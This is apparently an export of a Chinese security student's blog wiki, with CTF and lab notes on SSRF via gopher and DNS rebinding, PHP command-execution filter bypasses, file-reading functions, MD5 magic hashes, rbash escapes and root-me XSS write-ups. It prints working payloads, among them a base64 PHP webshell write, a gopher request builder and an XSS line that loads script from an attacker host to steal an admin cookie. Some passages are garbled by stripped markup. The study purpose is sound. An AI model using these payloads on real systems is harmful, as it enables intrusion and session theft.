[{"title":"本站指南：关于这里的记录","path":"/2025/12/23/本站指南：关于这里的记录/","content":"1# 👋 欢迎来到我的 Blog很高兴你能访问这里。建立这个博客的初衷，是为了对自己漫长的网络安全学习之路做一个系统的梳理和沉淀。 2# 这里的定位这不是一个随意灌水的地方，我主要会在这里分享两类内容： 3# 1. 🧩 知识点碎片 (Knowledge Points)在学习 Web 安全、内网渗透的过程中，我们总会遇到各种各样细碎但关键的知识点（比如某个特定的 Bypass 技巧、某个协议的特殊用法）。我会把这些碎片化的知识整理成文档，方便随时查阅，也希望能帮到遇到同样问题的你。 你可以在菜单的 文档 - [Web知识点] 中找到它们。 3# 2. 🎯 靶场实战 WP (WriteUp)“纸上得来终觉浅”。除了理论，我会记录挑战各种大型综合靶场（如 VulnHub，HackTheBox 等）的完整过程。这部分内容会重点复盘： 思路的形成 遇到的坑与排错 最终的利用链条 你可以在菜单的 文档 - [WP] 中找到它们。 2# 🚀 关于作者一名正在路上的安全学习者。如果你对本站的内容有疑问，或者想交流技术，欢迎通过 社交 里的方式联系我。 Stay Hungry, Stay Foolish. (本文置顶显示，作为本站内容的索引说明)","tags":["计划","说明"],"categories":["杂谈"]},{"path":"/wiki/WP/SSRF_内网访问.html","content":"伪协议 file://php://input # 执行php代码php://filter # 读取源码 write的话GET提交?file=php://filter/wirte=convert.base64-decode/resource=2.phpPOST提交content=PD9waHAgYXNzZXJ0KCRfUE9TVFt4XSk7Pz4=zip:// #压缩文件data:// #执行php代码 ?url=data://text/plain,?php system(ls);? gopher协议 gopher协议（攻击内网服务的万金油）：gopher支持发出GET、POST请求。可以先截获get请求包和post请求包，再构造成符合gopher协议的请求。gopher协议是ssrf利用中一个最强大的协议(俗称万能协议)。可用于反弹shell(具体看脚本文件)from urllib.parse import quotepayload = \\POST /flag.php HTTP/1.1Host: 127.0.0.1:80Content-Type: application/x-www-form-urlencodedContent-Length: 36key=260a97ac2ef360dec36238c7d6c49c25payload = quote(payload)payload = payload.replace(%0A, %0D%0A)payload = fgopher://127.0.0.1:80/_quote(payload)print(payload)URL: gopher://host:port/gopher-path_后接TCP数据流---也就是构造的包（要进行url编码，具体几次看情况）(!!!一定要有下斜杠)gopher协议中的post请求需要包含几个必要的字段HOST，Content-Length,Content-Type POST请求编码出来的换行是%0A，就需要把%0A改成%0D%0Agopher://127.0.0.1:80/_%250D%250APOST%2520/flag.php%2520HTTP/1.1%250D%250AHost%253A%2520127.0.0.1%253A80%250D%250AContent-Type%253A%2520application/x-www-form-urlencoded%250D%250AContent-Length%253A%252036%250D%250A%250D%250Akey%253D260a97ac2ef360dec36238c7d6c49c25%250D%250A fastcgi协议（进程间通信） CGI协议 # 访问url -- 浏览器生成HTTP请求报文 -- web server解析请求（例如nginx）web server 是内容的分发者当访问静态页面时，web server 会直接返回资源，例如index.html当访问动态页面时，web server 会调用解析器，例如index.php # -- 访问CGI# -- CGI初始化环境，加载配置，处理请求，返回资源，结束进程 （每次处理请求后都会销毁进程，浪费资源）FASTCGI # 访问url -- 浏览器生成HTTP请求报文 -- web server解析请求（例如nginx）当访问index.php时，web server 会把HTTP请求转换为FastCGI请求# -- 转换为FastCGI协议格式并发送给解析器，这里以php为例# -- 发送至php-fpm process managerphp-fpm接收到请求后，把请求分配给一个worker，worker就是一个解析服务的进程（一直运行），worker根据请求信息，解析php，返回页面例如，招新平台运行了15个worker，（不考虑nginx处理时间）同时可以处理15个请求# -- php-fpm解析并响应 redis 协议，和上面一样，可以直接用gopherus 的redis模块 ，使用默认的，会自动生成shell.php cmd为密码 SSRF Bypass url Bypass 1.使用HTTP基础认证 HTTP 基本身份认证允许 Web 浏览器或其他客户端程序在请求时提供用户名和口令形式的身份凭证的一种登录验证方式。也就是：http://www.xxx.com@www.yyy.com形式简单来说，就是http://www.baidu.com@192.168.0.1/与http://192.168.0.1请求的都是192.168.0.1的内容。这里的@是主域名解析，即@符号后面直接跟域名，@符号前面的内容会被视为用户名，相当于以http://baidu.com的用户名访问192.168.0.1/flag.php，至于用户名是啥不重要，关键是@后面的才是解析的地址！2.使用nip.io .nip.io 是一个特殊的域名后缀，它提供了一种免费且简便的方式，可以将特定格式的域名解析为对应的IP地址，可以作为应用路由的解析服务。这省去了配置本地hosts文件的步骤。例如，当访问http://anything-IP Address.nip.io时，它将解析到对应的IP地址IP Address?url=http://notfound.ctfhub.com.127.0.0.1.nip.io/flag.php 数字IP Bypass 1.ip转int 2.十六进制3.八进制4.localhost、http://0/等5.ipv6绕过 302跳转 Bypass 需要vps 暂时跳过 DNS重解析 对于用户请求的URL参数，首先服务器端会对其进行DNS解析，然后对于DNS服务器返回的IP地址进行判断，如果在黑名单中，就pass过滤掉.但是在整个过程中，第一次去请求DNS服务进行域名解析到第二次服务端去请求URL之间存在一个时间差，利用这个时间差，我们可以进行DNS 重绑定攻击，利用DNS Rebinding技术，在第一次校验IP的时候返回一个合法的IP，在真实发起请求的时候，返回我们真正想要访问的内网IP即可要完成DNS重绑定攻击，我们需要一个域名，并且将这个域名的解析指定到我们自己的DNS Server，在我们的可控的DNS Server上编写解析服务，设置TTL时间为0，这是为了防止有DNS服务器对解析结果进行缓存。这样就可以进行攻击了，完整的攻击流程为：1、服务器端获得URL参数，进行第一次DNS解析，获得了一个非内网的IP2、对于获得的IP进行判断，发现为非黑名单IP，则通过验证3、服务器端对于URL进行访问，由于DNS服务器设置的TTL为0，所以再次进行DNS解析，这一次DNS服务器返回的是内网地址4、由于已经绕过验证，所以服务器端返回访问内网资源的结果总结来说：由于我们无法在程序运行时以毫秒为单位手动更改DNS记录，所以要想实现DNS重绑定攻击，就必须配置一个自定义的恶意DNS服务器，并设定好指定域名的解析IP，再将TTL设置为0，使其解析时在非法内网IP与合法其他IP间反复横跳。用下面这个网站可以进行DNS重绑定rbndr.us dns rebinding service (cmpxchg8b.com)绑定的两个ip中保证有一个是127.0.0.1即可，我这里和192.168.0.1绑定了，结果为7f000001.c0a80001.rbndr.us因此我们的url=7f000001.c0a80001.rbndr.us/flag.php ，注意这个域名相当于绑定了两个ip地址（同一时刻只对应一个），由于无法确定进行dns校验时的ip是否为127.0.0.1，可能一次请求不成功，多刷新几次即可。"},{"path":"/wiki/Web知识点/漏洞发现.html","content":""},{"path":"/wiki/笔记/linux学习.html","content":"stdin stdout stderr对应文件标识符：0 1 2 如果我们想将 STDOUT 和 STDERR 重定向到一个文件，我们可以使用font style=color:rgb(51, 51, 51);background-color:rgb(247, 247, 247);/font。这个“”代表 FD 1 和 FD 2 表示 1和2 重定向 追加 覆盖 | 管道符 rm -r r 递归创建文件 touchuniq 去除相邻重复行 想要去除整个文件，可以先sort，然后去除 cat animals | tee unsorted.txt | sort | uniq sorted.txt tee的作用是将另一个命令输出的 STDIN 传递过去，同时将副本写入文件 用户权限 uid(用户标识符) root 0 普通 1-501 useradd -u 指定uid -d 指定目录 passwd -d 清空密码 -l 锁定账户 -u 解锁 -S 是否锁定 usermod -l 更改名字 -L 锁定 -U 解锁 userdel -r 文件权限or目录权限 r w x chmod -R递归修改权限 umask 设定文件初始权限 chown 属主 文件或目录 set位 s 粘滞位 t 共享文件用 chattr i 全锁 a 修改锁 +，-，用法相同 网络route route add -net 我要去哪 gw 下一跳地址 route add default gw 网关 修改网络 vim etcsysconfignetwork-scriptsifcfg-xxx BOOTPROTOdhcp -static onbootyes ipaddr netmask gateway dns1 dns2 查看dns cat etcresolv.conf"},{"path":"/wiki/笔记/JS渗透.html","content":"先找到JS文件 熊猫头 Packer-Fuzzer 异步js JS接口提取 脚本文件 目录FUZZ和接口提取的奇妙搭配 我们假设你通过分析JS找到了很多接口，比如 http://test.hack.com/api/test/admin/delete http://test.hack.com/api/test/admin/edit http://test.hack.com/api/test/admin/get 这种时候我们要注意了，接口的命名一般都和功能高度相关。这里有管理员用户的删除（delete）、编辑（edit）、获取（get） 那么你还能想到什么？是不是有可能能有添加（add、create）。那我们可以注意FUZZ这个点 http://test.hack.com/api/test/admin/add http://test.hack.com/api/test/admin/create 总之就是有“添加”这个意思的单词。对于增删改查的接口关键词，我自己总结了一些。 查询（获取信息）search list select query get find 删除（删除某个数据）del Delete 编辑（更新某个信息）Update Up edit Change 添加（增加某个信息）add create new API测试 GET POST 测试 别忘了路径可能有问题 POST参数测试 返回内容拼接 JS查找 脚本获取 路径三种情况 第一种是目标站点没有任何对前端uri的鉴权。我们这么去访问，能直接看到页面，也不会给你跳转啥的，这时候就可以调用页面上的功能去抓包，分析这些功能点对应的接口的问题了。 第二种情况稍微好点，就是你这么去访问，有概率看到要访问的页面闪一下，然后给你重定向回登录页面，这种时候有种拼手速的玩法，在重定向回登录页面之前，浏览器上的刷新按钮会变成这个状态：在他重定向回去之前，快速点一下这个X，那么后续动作就会终止执行，你的页面就会卡住。这时候我们也是开启burp愉快抓包就行。其实就是阻止重定向的思路。 - font style=color:rgb(0,0,0);第三种情况就是，我们没法看到想访问的页面，前端要么没反应，要么给你弹出个没有权限，要么直接重定向到/fontfont style=color:rgb(0,0,0);/login/fontfont style=color:rgb(0,0,0);登录页。这种时候我们又该怎么测试呢？下面的内容就需要一点前端调试和/fontfont style=color:rgb(0,0,0);JS/fontfont style=color:rgb(0,0,0);分析的基础了，本文不会深入展开，仅作案例介绍。/font 假设这么一个网站，我们提取出一个前端uri为home （很常见） 我们自然要尝试访问，一访问，发现直接给我们重定向到登录口 我们自然要尝试访问，一访问，发现直接给我们重定向到登录口 这就说明这个前端至少有两层校验，一层与用户登录状态有关，一层与用户权限有关。怎么办呢？我们在控制台搜索“内测”关键词，定位到用户权限鉴权逻辑。 分析这个局部，我们其实很容易能注意到这里的前端鉴权逻辑。前端获取o.state.account.permission属性，一旦这个属性为false，那么就会提示平台内测这个错误，无法访问到对应的前端uri。 那么用户登录状态对应什么属性呢？往上翻一下，不难看出对应o.state.baseInfo.isLogin属性 因此我们可以推测，state中保存了用户的基本信息，比如登录状态、权限等等。因此这里好办了，我们给上述两个位置打上断点，重新访问home。进入第一个断点 在控制台将其强行改为true 进入下一断 同样地，再控制台对其赋值为1 再往下走，此时会跳转到一个contract页面 虽然没进入home页面，但是这样，我们就来到了一个原本无法直接访问到的一个前端uri，这样就可以调用它的功能了，看这个页面要填的东西很多，最后的传参肯定巨复杂，就算开发好心告诉你缺了什么参数，你敲都要敲半天，用这种方法测起来就快多了。 当然，我们的目的是进入home页面，重定向到这个完善账号信息的页面，说明还是有哪里的鉴权没搞好，我们再回到刚刚的鉴权逻辑部分 可以发现，后续其实还对o.state.account.permission的值做了一个判断，如果值为1，那么会直接进入contract页面。值只要是大于1的整数，其实都可以访问到home页面 因此在控制台将permission改为3 再访问home，成功： 这样，我们就可以愉快的测试后台的各种功能点了。当然上述操作对不懂JS和前端调试的师傅肯定也不太友好。实际上上述操作和平时测试业务逻辑漏洞中的“修改返回包”操作是有等价关系的。为什么这么说呢？ 我们重新访问一下home页面，然后在burp抓包，拦截一下返回包。 可以看到一个state_user的后端接口，从这个接口的名字我们其实就知道，它是用来判断一个用户状态的。 然后你再注意这里的account_state，默认是0。以及这个is_login，默认是false。他们是不是就特别像我们刚刚在JS里分析出来的o.state.account.permission和o.state.baseInfo.isLogin？我们推测这个前端实际上就是从返回包里拿到account_state和is_login，并分别给o.state.account.permission、o.state.baseInfo.isLogin赋值的。 因此我们将其分别改为3和true，然后把另一个code改为200，发包 还是能看到后台页面。这样虽然操作起来比较简单友好，但是万一目标前端对响应结果的判断设置的比较复杂，那就不是那么好办了，比如我前端判断permission为test123abcdef才为有效，我们常见的改响应包的方法就很难改成这样了，所以还是回到JS去分析调试才能应对大部分奇葩情况，还是比较吃基本功的。 json传参里常见的类型其实也就是下图这些 a为整型，b为字符串类型，c为布尔类型，d为数组类型，e为对象类型。这几种类型都试一下准没错，而且大多数情况下类型错了后端是要直接抛出异常信息的，从异常信息里就很容易能看出来这个地方要传入什么类型，比如异常里看到xxxxx Object xxxxxx，就可以猜测某个参数可能要传入对象类型的传参。"},{"path":"/wiki/内网/权限维持.html","content":"SharPersist.exe"},{"path":"/wiki/WP/REC/REC过滤.html","content":"RECping -c 1 wwww.baidu.com ping -c 1 wwww.baidu.com 在命令执行有下面几种可能： 命令可控 比如我们可以控制ping这个字符串 参数可控 -c 可控 参数值可控 1和www.baidu.com 可控 整体可控，但是要突破过滤 我们遇到命令执行，需要首先判断可控的位置，然后针对性的绕过 可以用系统函数:system exec highlight system(‘ls’); exec() **exec()**默认没有回显,需要手动加上echo.而且只会回显出一行结果,因此常用第二个数组参数接收多行结果. payload:$arr=[]; echo exec(ipconfig,$arr); var_dump($arr); **shell_exec()**默认没有回显,需要手动加上echo,可以输出多行结果. payload:echo shell_exec(ipconfig); highlight 其他函数 passthru echo php伪协议 show_source passthru(‘ls’); 同 system echo tac config.php; PHP 支持一个执行运算符：反引号（``）。注意这不是单引号！PHP 将尝试将反引号中的内容作为 shell 命令来执行，并将其输出信息返回（即，可以赋给一个变量而不是简单地丢弃到标准输出）。 - 伪协议:include(php://filter/read=convert.base64-encode/resource=config.php); - show_source(config.php); //和highlight_file() 一样，将指定 PHP 文件的源代码以高亮形式输出到浏览器或返回为字符串 用get方式 ?c=echo \\`$_GET[1]`\\;1=tac config.php 构造system ?c=$a=sys;$b=tem;$d=$a.$b;$d(cat config.php); cat 被过滤：除了cat 还有 tac、more、 less、head、tail、nl、sed、sort、uniq、rev 文件本身被过滤，可以模糊匹配 con* ，也可以base64加密解密 ?c=$a=base64_decode(Y2F0IGNvbmZpZy5waHA=);passthru($a); Y2F0IGNvbmZpZy5waHA=是cat config.php的base64加密 如果；被禁，可以尝试闭合整个php代码 ? 参数是C 可以用$_GET[a] 来绕过 1.涉及到一个php的代码结构，.....②payload为：?c=include $_GET[a]?，等同于，php的最后一行代码可以省去分号.....③include函数包含文件，且题目是对参数c正则过滤，因此GET型传参a可以绕过，从而执行我们的伪协议文件命令，读取config.php文件：php://filter/convert.base64-encode/resource=./config.php④因此连起来构造的payload为： ?c=include $_GET[a]?a=php://filter/convert.base64-encode/resource=config.php2./?c=echo `$_GET[a]`?a=cat config.php 让其echo一个get请求，?闭合，请求内容为cat config.php 也可以用post来绕过：先?cecho $_POST[a\\];然后再用hackbar传参数 a cat config.php 只禁用了*和?常用通配符，还可以使用其他通配符[c1-c2],[!c1-c2],[list]等 payload：?cecho tac confi[g][!0-9]ph[p]; nginx 日志文件路径 varlognginxaccess.log 可以用 cvarlognginxaccess.log1system(“tac%2036d.php”); 来绕过c 的检测 print_r(glob(“*”)) : glob()函数返回匹配指定模式的文件名或目录。因此我们可以使用glob函数来查找文件，也可以实现目录的遍历 scandir()也可以，具体用法 :print_r(scandir(‘.‘)) 文件包含的用处在php中利用该函数可以将其他文件引入当前php文件，被引入的文件里有php语句就能正常发挥作用 可以先引入文件，再用中国蚁剑连接 也可以直接用，参考12 过滤空格cat$IFSflag.txtcat$IFS$9flag.txt $IFS$1 也可以catflag.txt catflag.txt %0a代替换行，%09代替TAB键 过滤 ：可以先目录再查看 cd xxxx;cat xxx"},{"path":"/wiki/笔记/网络.html","content":"lan–wanNAT –switch–route lan 局域网，switch 是按mac地址区分，一旦经过路由器，就会变成ipdns查看上一条信息是否成功 echo $?"},{"path":"/wiki/WP/REC/linux标准输入输出.html","content":"web42if(isset($_GET[c])) $c=$_GET[c]; system($c. /dev/null 21);else highlight_file(__FILE__); 知识点 devnull 210 标准输⼊1 标准输出2 错误输出在类Unix系统中,/dev/null,或称空设备,是⼀个特殊的设备⽂件,它丢弃⼀切写⼊其中的数据(但报告写⼊操作成功)区别：2/dev/null 把错误输出到空设备（即丢弃）/dev/null 21 相当于1/dev/null 21 即把标准输出丢弃，并且把错误输出输出到标准输出。合计起来就是错误和标准输出都输出到空设备21 /dev/null 错误输出到标准输出，即输出到屏幕上，⽽标准输出被丢弃重定向 和 前者会先清空⽂件，然后再写⼊内容，后者会将重定向的内容追加到现有⽂件的尾部. 解题关键点 分割：| || ?c=tac flag |ls;"},{"path":"/wiki/WP/REC/无参数REC.html","content":"代码if(isset($_GET[c])) $c = $_GET[c]; if(!preg_match(/[0-9]|\\~|\\`|\\@|\\#|\\\\$|\\%|\\^|\\|\\*|\\（|\\）|\\-|\\=|\\+|\\|\\[|\\]|\\|\\:|\\|\\|\\,|\\|\\.|\\|\\/|\\?|\\\\\\\\/i, $c)) eval($c); else highlight_file(__FILE__); 常见绕过姿势getallheaders()：返回所有的HTTP头信息，返回的是数组⽽eval要求为字符串，所以要⽤implode()函数将数组转换为字符串get_defined_vars()：该函数的作⽤是获取所有的已定义变量，返回值也是数组，不过是⼆维数组，⽤var_dump()输出可以看⻅输出的内容，看⻅在第⼏位之后，可以⽤current()函数来获取其值，详细可以看官⽅函数。payload：var_dump(current(get_defined_vars()));session_id()：session_id()可以⽤来获取/设置当前会话 ID，可以⽤这个函数来获取cookie中的phpsessionid，并且这个值我们是可控的。 如可以在cookie中设置 PHPSESSID=706870696e666f28293b，然后⽤hex2bin()函数，即传⼊?exp=eval(hex2bin(session_id(session_start()))); 并设置cookie：PHPSESSID=706870696e666f28293b session_start 函数是为了开启session配合使⽤的函数：print_r(scandir(‘.’)); 查看当前⽬录下的所有⽂件名 var_dump()localeconv() 函数返回⼀包含本地数字及货币格式信息的数组。current() 函数返回数组中的当前元素（单元）,默认取第⼀个值，pos是current的别名each() 返回数组中当前的键/值对并将数组指针向前移动⼀步end() 将数组的内部指针指向最后⼀个单元next() 将数组中的内部指针向前移动⼀位prev() 将数组中的内部指针倒回⼀位array_reverse() 以相反的元素顺序返回数组 payload1?c=echo highlight_file(next(array_reverse(scandir(pos(localeconv()))))); 解释?c=echo highlight_file(next(array_reverse(scandir(pos(localeconv())))));：这是一个GET请求的参数c，其值是一个PHP表达式。echo：PHP中的输出函数，用于输出字符串或表达式的结果。highlight_file：PHP中的函数，用于高亮显示PHP文件的内容。next：PHP中的函数，用于将内部指针向前移动到下一个元素。array_reverse：PHP中的函数，用于反转数组元素的顺序。scandir：PHP中的函数，用于列出目录中的文件和子目录。pos：PHP中的函数，返回数组中当前内部指针指向的值。localeconv()：PHP中的函数，返回本地化的数字和货币格式信息。 具体来说，这段代码的执行流程如下：localeconv()：获取本地化的数字和货币格式信息。pos(localeconv())：获取localeconv()返回数组中当前内部指针指向的值。scandir(pos(localeconv()))：列出pos(localeconv())指向的目录中的文件和子目录。array_reverse(scandir(pos(localeconv())))：反转这些文件和子目录的顺序。next(array_reverse(scandir(pos(localeconv()))))：将内部指针移动到下一个元素，即下一个文件或子目录。highlight_file(next(array_reverse(scandir(pos(localeconv())))))：高亮显示这个文件的内容。echo：输出这个高亮显示的内容。 payload2?c=eval(next(reset(get_defined_vars())));1=;system(tac%20flag.php); 解释?c=eval(next(reset(get_defined_vars())));：这是GET请求的一部分，其中c参数的值是一个PHP表达式。get_defined_vars()：这个函数返回当前所有已定义变量的数组，包括局部变量和全局变量。reset()：这个函数将数组内部指针指向第一个元素，并返回该元素的值。next()：这个函数将数组内部指针向前移动一位，并返回当前指针处的元素值。eval()：这个函数执行字符串作为PHP代码。这段代码的目的是尝试执行get_defined_vars()返回的第一个元素的下一个元素的值作为PHP代码。1=;system(tac%20flag.php);：这是GET请求的另一部分，尝试通过URL参数执行系统命令。system()：这个函数执行一个shell命令，并将完整的输出返回。tac%20flag.php：这里的命令是tac flag.php，tac是反向输出文件内容的Unix命令，%20是URL编码的空格。这段代码的目的是尝试执行flag.php文件的反向内容。 payload3题解，查看当前工作目录getcwd()，扫描当前目录及文件scandir()输出 为数组，flag.php 在倒数第二个个位置那就数组倒置array_revers()，变为正数第二，在使用next()函数指向从第一个指向第二个（及指向flag.php）,最后使用show_source（）查看文件的内容 ?c=print_r(show_source(next(array_reverse(scandir(getcwd())))));url+?c=print_r(getcwd()); === /var/www/htmlurl+?c=print_r(scandir(getcwd())); === Array ( [0] = . [1] = .. [2] = flag.php [3] = index.php )url+?c=print_r(array_reverse(scandir(getcwd()))); == Array ( [0] = index.php [1] = flag.php [2] = .. [3] = . )url+?c=print_r(next(array_reverse(scandir(getcwd())))); == flag.phpurl+?c=print_r(show_source(next(array_reverse(scandir(getcwd()))))); == $flag=ctfshoweca2e7df-d196-4b71-9632-ad4d32e194d3; 读取目录getallheaders()：返回所有的HTTP头信息，返回的是数组⽽eval要求为字符串，所以要⽤implode()函数将数组转换为字符串get_defined_vars()：该函数的作⽤是获取所有的已定义变量，返回值也是数组，不过是⼆维数组，⽤var_dump()输出可以看⻅输出的内容，看⻅在第⼏位之后，可以⽤current()函数来获取其值，详细可以看官⽅函数。payload：var_dump(current(get_defined_vars()));session_id()：session_id()可以⽤来获取/设置当前会话 ID，可以⽤这个函数来获取cookie中的phpsessionid，并且这个值我们是可控的。 如可以在cookie中设置 PHPSESSID=706870696e666f28293b，然后⽤hex2bin()函数，即传⼊?exp=eval(hex2bin(session_id(session_start()))); 并设置cookie：PHPSESSID=706870696e666f28293b session_start 函数是为了开启session配合使⽤的函数：print_r(scandir(‘.’)); 查看当前⽬录下的所有⽂件名 var_dump()localeconv() 函数返回⼀包含本地数字及货币格式信息的数组。current() 函数返回数组中的当前元素（单元）,默认取第⼀个值，pos是current的别名each() 返回数组中当前的键/值对并将数组指针向前移动⼀步end() 将数组的内部指针指向最后⼀个单元next() 将数组中的内部指针向前移动⼀位prev() 将数组中的内部指针倒回⼀位array_reverse() 以相反的元素顺序返回数组"},{"path":"/wiki/WP/REC/获取目录.html","content":"函数"},{"path":"/wiki/WP/REC/读取文件.html","content":"函数highlight_file($filename);show_source($filename);require($filename)print_r(php_strip_whitespace($filename));print_r(file_get_contents($filename));readfile($filename);print_r(file($filename)); // var_dumpfread(fopen($filename,r), $size);include($filename); // ⾮php代码include_once($filename); // ⾮php代码require($filename); // ⾮php代码require_once($filename); // ⾮php代码print_r(fread(popen(cat flag, r), $size));print_r(fgets(fopen($filename, r))); // 读取⼀⾏fpassthru(fopen($filename, r)); // 从当前位置⼀直读取到 EOFprint_r(fgetcsv(fopen($filename,r), $size));print_r(fgetss(fopen($filename, r))); // 从⽂件指针中读取⼀⾏并过滤掉 HTML 标记print_r(fscanf(fopen(flag, r),%s));print_r(parse_ini_file($filename)); // 失败时返回 false , 成功返回配置数组print_r(glob(*)); // 列当前⽬录print_r(glob(/*)); // 列根⽬录print_r(scandir(.));print_r(scandir(/));$d=opendir(.);while(false!==($f=readdir($d)))echo$f ;$d=dir(.);while(false!==($f=$d-read()))echo$f. ;$a=glob(/*);foreach($a as $value)echo $value. ;$a=new DirectoryIterator(glob:///*);foreach($a as $f)echo($f-__toString(). );"},{"path":"/wiki/WP/REC/无字母.html","content":"知识点bin为binary的简写，主要放置⼀些系统的必备执⾏档例如:cat、cp、chmod df、dmesg、gzip、kill、ls、mkdir、more、mount、rm、su、tar、base64等。我们⽇常直接使⽤的cat或者ls等等都其实是简写，例如ls完整全称应该是/bin/ls"},{"path":"/wiki/WP/PHP特性/MD5绕过.html","content":"知识点弱比较类型字符串和数字进行比较时，会把字符串强制转换为数字(如果字符串开头有数字，则转换为开头数字，没有则转换为0) ==：只比较数据值——数据值相同，不比较数据类型!=: 只比较数据值——数据值不同 var_dump(123==123a);#bool(true)var_dump(123==1234a);#bool(false)var_dump(0==abc);#bool(true) 强比较类型不仅要比较数据的值也要比较数据的类型，例如str和int两种数据类型就不会相等 ===：比较数据类型——数据类型相同 比较数据值——数据值相同!==：比较数据类型——数据类型不同 || 比较数据值——数据值不同 var_dump(123===123a);#bool(false)var_dump(123===123);#bool(false)var_dump(123===123);#bool(true 当php处理字符串时，会利用“ ”或者“ ”来比较 当“”时： php把每一个以”0E”开头的哈希值都解释为0，所以要绕过””，需要想办法让两边的不同数值经过md5加密后都为“0E”开头，这样当处理到这里的代码时，php会认为它们两个都为0，即可绕过。 开头为0E（MD5值）字母数字混合类型：s878926199a0e545993274517709034328855841020s155964671a0e342768416822451524974117254469s214587387a0e848240448830537924465865611904s214587387a0e848240448830537924465865611904纯大写字母：QLTHNDT0e405967825401955372549139051580QNKCDZO0e830400451993494058024219903391EEIZDOI0e782601363539291779881938479162纯数字：2406107080e46209743190650901956298873685440116270630e48580568703443990593836270177547756350650e99821208994664096759945036116847905553610e643442214660994430134492464512 5432453531 0e51231869908588163086189052609755796798200e877622011730221803461740184915 55853935790e66435735538230580599276533702363765525010e165886706997482187870215578015 7124129977 0e500007361044747804682122060876 71975461970e9151885760724691014573156755027656486157 0e451569119711843337267091732412 php中的md5()函数无法处理数组类型数据，对于数组类型数据返回NULL，当我们传入两个数组时，就会变成两个NULL，也就是NULLNULL，成功绕过 当为“”：在类型相同时才相等。”“即non-strict比较符，会在类型转换后进行比较。 此外0 字符会被认为是正确的，可以绕过验证。"},{"path":"/wiki/WP/Linux提权/rbash.html","content":"什么是rbashrbash,即受限制的 bash,其可以用作中转服务器（实际上rbash只是bash的一个软链接）。它与一般shell的区别在于会限制一些行为，让一些命令无法执行。 如何设置rbash1，复制一个bash，重命名为rbash cp /bin/bash /bin/rbash2，设置用户tom登陆的shell为rbash useradd -s /bin/rbash tom3, 在tom用户下新建一个.bin目录存放可以执行的命令 mkdir -p /home/tom/.bin4, 通过软连接执行命令 ln -s /bin/clear /home/$tom/.bin/clear5, 编辑文件/home/$tom/.bashrc,添加export PATH=$HOME/.bin/.文件一定要以# .bashrc为首行. 如何绕过限制信息收集tom@DC-2:~$ echo $PATH/home/tom/usr/bintom@DC-2:~$ echo /home/tom/usr/bin/*/home/tom/usr/bin/less /home/tom/usr/bin/ls /home/tom/usr/bin/scp /home/tom/usr/bin/viemv 查看环境变量 特别是查看shell 和PATH检查编程语言 java php ...sudo -l 常见的逃逸技术 “ ” 如果允许，直接运行binbash cp cp /bin/bash test1cp /bin/sh test2./test1 # 切换到了/bin/bash./test2 # 切换到了/bin/sh 常见的应用 1 ftp,gdb,man ftp !/bin/sh gdb !/bin/sh man !/bin/sh2 git git git help status3 vi/vim :set shell=/bin/bsah :shell 或者 :!/bin/bash4 BASH_CMDS[a]=/bin/sh;a #把/bin/bash给a变量export PATH=$PATH:/bin/ #将/bin 作为PATH环境变量导出export PATH=$PATH:/usr/bin #将/usr/bin作为PATH环境变量导出"},{"path":"/wiki/WP/PHP特性/特性.html","content":"1.intval()intval() 函数通过使用指定的进制 base 转换（默认是十进制），返回变量 var 的 integer 数值。 intval() 不能用于 object，否则会产生 E_NOTICE 错误并返回 1 intval($num, 0) 的作用:intval() 是 PHP 函数，用于将变量 $num 转换为整数。参数 0 表示进制自动检测：如果 $num 以 0x 或 0X 开头（如 0x117c），按十六进制转换。如果 $num 以 0 开头（如 010574），按八进制转换。其他情况（如 4476），按十进制转换。 2. 正则show_source(__FILE__);include(flag.php);$a=$_GET[cmd];if(preg_match(/^php$/im, $a)) if(preg_match(/^php$/i, $a)) echo hacker; else echo $flag; else echo nonononono; /i表示匹配大小写字符 ^ 和 $ 同时使用时，表示精确匹配，需要匹配以php开头和以php结尾/m 多行匹配 若存在换行 并且有开始^或结束$符的情况下，将以换行为分隔符，逐行进行匹配但是当出现换行符 %0a的时候，$cmd的值会被当做两行处理，而此时第二个if正则匹配不符合以php开头和以php结尾 3.in_array()in_array(search,array,type)如果给定的值 search 存在于数组 array 中则返回 true。如果第三个参数设置为 true，函数只有在元素存在于数组中且数据类型与给定值相同时才返回 true。如果没有在数组中找到参数，函数返回 false。注释：如果 search 参数是字符串，且 type 参数设置为 true，则搜索区分⼤⼩写。 没有第三个参数的时候进⾏的就是弱⽐较，就会存在强制的类型转换，如123.php就会转换成123 4.优先级 and5. 反射类反射类ReflectionClass执⾏命令ReflectionClass反射类在PHP5新加⼊，继承⾃Reflector，它可以与已定义的类建⽴映射关系，通过反射类可以对类操作反射类不仅仅可以建⽴对类的映射，也可以建⽴对PHP基本⽅法的映射，并且返回基本⽅法执⾏的情况。因此可以通过建⽴反射类new ReflectionClass(system(cmd))来执⾏命令 6.is_numeric()is_numeric() ⽤于检测是否为数字或数字字符串，如果指定的变量是数字和数字字符串则返回true ，否则返回false。如果字符串中含有⼀个e代表科学计数法，也可返回true。 7.call_user_func()call_user_func() 函数⽤于调⽤⽅法或者变量，第⼀个参数是被调⽤的函数，第⼆个是调⽤的函数 的参数 8."},{"path":"/wiki/WP/root-me/XSS - Reflected(反射型).html","content":"直接看看有没有注入点 发现有个?pprices，尝试有没有注入点 报404，检查一波， 发现在链接内，可以构造一下 结果没反应，应该是被过滤掉了 发现onmousemove 和’ 可以用 但题目要求是admin 不会点击所有可疑的 XSS 链接 ，尝试本地构造隐形化xss,向服务器发送cookie， 服务器利用蓝莲花xss平台构建https://github.com/firesunCN/BlueLotus_XSSReceiver 生成本地js,构建payload 发现被过滤掉了,换种方式 ?pexp%27%20onmouseover%27(function(){var%20sdocument.createElement(%22script%22);s.src%22http://your-ip/myjs/test.js%22;document.head.appendChild(s)})()%27 给管理员提交你的报告，等待一段时间，就会返回内容，他会发送很多次，有时候没发过来，得多找一下"},{"path":"/wiki/WP/root-me/XSS--Server Side(服务端).html","content":"https://www.root-me.org/en/Challenges/Web-Server/XSS-Server-Side进页面之后，发现可以生成信息，页面很熟悉，想到可以试试存储型sxx 发现，无论输入什么，都会返回 看到一个注册页面，试试，注册页面有没有注入点 注册之后，登录，看有没有会显示在页面上的(反射型xss特点，找页面回显的)， 说明first name 和last name 会回显 生成证书 说明可以从first name 和last name入手构造xss 然后构造payload scriptdocument.write(iframe src=file:///flag.txt/iframe);/script 获取flag"},{"path":"/wiki/WP/session/session.html","content":"题目if(isset($_GET[file])) $file = $_GET[file]; $file = str_replace(php, ???, $file); $file = str_replace(data, ???, $file); $file = str_replace(:, ???, $file); $file = str_replace(., ???, $file); include($file);else highlight_file(__FILE__); 